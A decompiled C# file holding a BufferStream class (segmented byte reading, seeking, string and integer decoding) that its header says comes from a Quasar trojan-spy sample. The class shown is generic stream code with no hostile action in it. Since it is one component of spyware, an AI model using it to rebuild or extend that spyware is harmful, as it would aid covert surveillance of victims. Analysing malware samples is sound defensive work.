// Decompiled with JetBrains decompiler
// Type: NoiseMe.Drags.App.Models.SuperSocket.ProtoBase.BufferStream
// Assembly: Stubv2.0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E945C042-2241-44AF-B826-4AD3FC72B170
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Quasar.gen-a3f98ee0a78f039e0a9ea52dba13c713dc46f749512bd7d108cc9c05f57fc93d.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading;

namespace NoiseMe.Drags.App.Models.SuperSocket.ProtoBase
{
  public class BufferStream : Stream, IBufferStream
  {
    private IList<ArraySegment<byte>> m_Segments;
    private long m_Position;
    private int m_CurrentSegmentIndex;
    private int m_CurrentSegmentOffset;
    private long m_Length;
    private byte[] m_Buffer = new byte[8];
    private const string c_ThreadBufferSegmentStream = "ThreadBufferListStream";

    public void Initialize(IList<ArraySegment<byte>> segments)
    {
      this.m_Segments = segments.Count > 0 ? segments : throw new ArgumentException("The length of segments must be greater than zero.");
      this.m_CurrentSegmentIndex = 0;
      this.m_CurrentSegmentOffset = segments[0].Offset;
      this.m_Position = 0L;
      long num = 0;
      for (int index = 0; index < segments.Count; ++index)
        num += (long) segments[index].Count;
      this.m_Length = num;
    }

    public static BufferStream GetCurrent() => BufferStream.GetCurrent<BufferStream>();

    public static TStream GetCurrent<TStream>() where TStream : BufferStream, new()
    {
      LocalDataStoreSlot namedDataSlot = Thread.GetNamedDataSlot("ThreadBufferListStream");
      if (Thread.GetData(namedDataSlot) is TStream data1)
        return data1;
      TStream data2 = new TStream();
      Thread.SetData(namedDataSlot, (object) data2);
      return data2;
    }

    public IList<ArraySegment<byte>> Buffers => this.m_Segments;

    public Stream GetCurrentStream() => (Stream) this;

    public void Reset()
    {
      this.m_Segments = (IList<ArraySegment<byte>>) null;
      this.m_CurrentSegmentIndex = 0;
      this.m_CurrentSegmentOffset = 0;
      this.m_Length = 0L;
      this.m_Position = 0L;
    }

    public void Clear() => this.m_Segments?.Clear();

    public override bool CanRead => this.m_Position < this.m_Length;

    public override bool CanSeek => true;

    public override bool CanWrite => false;

    public override void Flush() => throw new NotSupportedException();

    public override long Length => this.m_Length;

    public override long Position
    {
      get => this.m_Position;
      set => this.Seek(value, SeekOrigin.Begin);
    }

    public override int Read(byte[] buffer, int offset, int count)
    {
      int srcOffset = this.m_CurrentSegmentOffset;
      int num1 = 0;
      int num2 = 0;
      for (int currentSegmentIndex = this.m_CurrentSegmentIndex; currentSegmentIndex < this.m_Segments.Count; ++currentSegmentIndex)
      {
        ArraySegment<byte> segment = this.m_Segments[currentSegmentIndex];
        if (currentSegmentIndex != this.m_CurrentSegmentIndex)
          srcOffset = segment.Offset;
        int val2 = count - num1;
        int val1 = segment.Count - (srcOffset - segment.Offset);
        int count1 = Math.Min(val1, val2);
        Buffer.BlockCopy((Array) segment.Array, srcOffset, (Array) buffer, offset + num1, count1);
        num1 += count1;
        num2 = currentSegmentIndex;
        if (num1 >= count)
        {
          if (val1 > val2)
          {
            this.m_CurrentSegmentIndex = currentSegmentIndex;
            this.m_CurrentSegmentOffset = srcOffset + count1;
          }
          else
          {
            int index = currentSegmentIndex + 1;
            if (index >= this.m_Segments.Count)
            {
              this.m_CurrentSegmentIndex = currentSegmentIndex;
              this.m_CurrentSegmentOffset = srcOffset + count1;
            }
            else
            {
              this.m_CurrentSegmentIndex = index;
              this.m_CurrentSegmentOffset = this.m_Segments[index].Offset;
            }
          }
          this.m_Position += (long) num1;
          return num1;
        }
      }
      this.m_CurrentSegmentIndex = num2;
      this.m_CurrentSegmentOffset = 0;
      this.m_Position = this.m_Length;
      return num1;
    }

    public override long Seek(long offset, SeekOrigin origin)
    {
      if (origin == SeekOrigin.End)
        throw new ArgumentException("Cannot support seek from the end.");
      if (origin == SeekOrigin.Begin)
      {
        this.m_CurrentSegmentIndex = 0;
        this.m_CurrentSegmentOffset = this.m_Segments[0].Offset;
        this.m_Position = 0L;
      }
      if (offset == 0L)
        return this.m_Position;
      long num1 = (origin == SeekOrigin.Begin ? 0L : this.m_Position) + offset;
      long position = this.m_Position;
      for (int currentSegmentIndex = this.m_CurrentSegmentIndex; currentSegmentIndex < this.m_Segments.Count; ++currentSegmentIndex)
      {
        ArraySegment<byte> segment = this.m_Segments[currentSegmentIndex];
        if (currentSegmentIndex == this.m_CurrentSegmentIndex)
        {
          int currentSegmentOffset = this.m_CurrentSegmentOffset;
          position += (long) (segment.Count - (this.m_CurrentSegmentOffset - segment.Offset));
        }
        else
        {
          int offset1 = segment.Offset;
          position += (long) segment.Count;
        }
        if (position >= num1)
        {
          int num2 = (int) (position - num1);
          this.m_CurrentSegmentIndex = currentSegmentIndex;
          this.m_CurrentSegmentOffset = segment.Offset + segment.Count - num2;
          this.m_Position = num1;
          return num1;
        }
      }
      throw new Exception("Exceed the stream's end");
    }

    public override void SetLength(long value) => throw new NotSupportedException();

    public override void Write(byte[] buffer, int offset, int count) => throw new NotSupportedException();

    private void CheckInitialized()
    {
      if (this.m_Segments == null)
        throw new InvalidOperationException("Not initialized");
    }

    public IBufferStream Skip(int count)
    {
      this.CheckInitialized();
      if (count == 0)
        return (IBufferStream) this;
      if (count < 0)
        throw new ArgumentOutOfRangeException(nameof (count), "Count cannot be less than zero.");
      if (this.Length < (long) count)
        throw new ArgumentOutOfRangeException(nameof (count), "Cannot be greater than the length of all the buffers.");
      this.Position += (long) count;
      return (IBufferStream) this;
    }

    private IList<ArraySegment<byte>> Clone(
      int index,
      int segmentOffset,
      int length)
    {
      List<ArraySegment<byte>> arraySegmentList = new List<ArraySegment<byte>>();
      int val2 = length;
      IList<ArraySegment<byte>> segments = this.m_Segments;
      for (int index1 = index; index1 < segments.Count; ++index1)
      {
        ArraySegment<byte> arraySegment = segments[index1];
        int offset = arraySegment.Offset;
        int val1 = arraySegment.Count;
        if (index1 == index)
        {
          offset = segmentOffset;
          val1 = arraySegment.Count - (segmentOffset - arraySegment.Offset);
        }
        int count = Math.Min(val1, val2);
        arraySegmentList.Add(new ArraySegment<byte>(arraySegment.Array, offset, count));
        val2 -= count;
        if (val2 <= 0)
          break;
      }
      return (IList<ArraySegment<byte>>) arraySegmentList;
    }

    public IList<ArraySegment<byte>> Take(int length) => this.m_Segments is BufferList segments ? (IList<ArraySegment<byte>>) segments.Clone(this.m_CurrentSegmentIndex, this.m_CurrentSegmentOffset, length) : this.Clone(this.m_CurrentSegmentIndex, this.m_CurrentSegmentOffset, length);

    public string ReadString(int length, Encoding encoding)
    {
      int num1 = length;
      char[] chars = new char[encoding.GetMaxCharCount(length)];
      Decoder decoder = encoding.GetDecoder();
      int currentSegmentIndex = this.m_CurrentSegmentIndex;
      int byteIndex = this.m_CurrentSegmentOffset;
      int num2 = 0;
      while (currentSegmentIndex < this.m_Segments.Count)
      {
        ArraySegment<byte> segment = this.m_Segments[currentSegmentIndex];
        if (currentSegmentIndex != this.m_CurrentSegmentIndex)
          byteIndex = segment.Offset;
        int bytesUsed;
        int charsUsed;
        bool completed;
        if (byteIndex + length < segment.Offset + segment.Count)
        {
          int byteCount = length;
          int charCount = chars.Length - num2;
          decoder.Convert(segment.Array, byteIndex, byteCount, chars, num2, charCount, true, out bytesUsed, out charsUsed, out completed);
          num2 += charsUsed;
        }
        else
        {
          int byteCount = segment.Count - (byteIndex - segment.Offset);
          bool flush = byteCount == length;
          int charCount = chars.Length - num2;
          decoder.Convert(segment.Array, byteIndex, byteCount, chars, num2, charCount, flush, out bytesUsed, out charsUsed, out completed);
          num2 += charsUsed;
        }
        length -= bytesUsed;
        byteIndex += bytesUsed;
        if (length != 0)
        {
          if (currentSegmentIndex != this.m_Segments.Count - 1)
            ++currentSegmentIndex;
        }
        else
          break;
      }
      this.m_CurrentSegmentIndex = currentSegmentIndex;
      this.m_CurrentSegmentOffset = byteIndex;
      this.m_Position += (long) num1;
      return new string(chars, 0, num2);
    }

    protected void FillBuffer(int length)
    {
      if (length > 8)
        throw new ArgumentOutOfRangeException(nameof (length), "the length must between 1 and 8");
      if (this.Read(this.m_Buffer, 0, length) != length)
        throw new ArgumentOutOfRangeException(nameof (length), "there is no enough data to read");
    }

    public short ReadInt16() => this.ReadInt16(false);

    public short ReadInt16(bool littleEndian)
    {
      this.FillBuffer(2);
      byte[] buffer = this.m_Buffer;
      return !littleEndian ? (short) this.BigEndianFromBytes(buffer, 2) : (short) this.LittleEndianFromBytes(buffer, 2);
    }

    public ushort ReadUInt16() => this.ReadUInt16(false);

    public ushort ReadUInt16(bool littleEndian)
    {
      this.FillBuffer(2);
      byte[] buffer = this.m_Buffer;
      return !littleEndian ? (ushort) this.BigEndianFromBytes(buffer, 2) : (ushort) this.LittleEndianFromBytes(buffer, 2);
    }

    public int ReadInt32() => this.ReadInt32(false);

    public int ReadInt32(bool littleEndian)
    {
      this.FillBuffer(4);
      byte[] buffer = this.m_Buffer;
      return !littleEndian ? (int) this.BigEndianFromBytes(buffer, 4) : (int) this.LittleEndianFromBytes(buffer, 4);
    }

    public uint ReadUInt32() => this.ReadUInt32(false);

    public uint ReadUInt32(bool littleEndian)
    {
      this.FillBuffer(4);
      byte[] buffer = this.m_Buffer;
      return !littleEndian ? (uint) this.BigEndianFromBytes(buffer, 4) : (uint) this.LittleEndianFromBytes(buffer, 4);
    }

    public long ReadInt64() => this.ReadInt64(false);

    public long ReadInt64(bool littleEndian)
    {
      this.FillBuffer(8);
      byte[] buffer = this.m_Buffer;
      return !littleEndian ? this.BigEndianFromBytes(buffer, 8) : this.LittleEndianFromBytes(buffer, 8);
    }

    public ulong ReadUInt64() => this.ReadUInt64(false);

    public ulong ReadUInt64(bool littleEndian)
    {
      this.FillBuffer(8);
      byte[] buffer = this.m_Buffer;
      return !littleEndian ? (ulong) this.BigEndianFromBytes(buffer, 8) : (ulong) this.LittleEndianFromBytes(buffer, 8);
    }

    private long BigEndianFromBytes(byte[] buffer, int bytesToConvert)
    {
      long num = 0;
      for (int index = 0; index < bytesToConvert; ++index)
        num = num << 8 | (long) buffer[index];
      return num;
    }

    private long LittleEndianFromBytes(byte[] buffer, int bytesToConvert)
    {
      long num = 0;
      for (int index = 0; index < bytesToConvert; ++index)
        num = num << 8 | (long) buffer[bytesToConvert - 1 - index];
      return num;
    }
  }
}
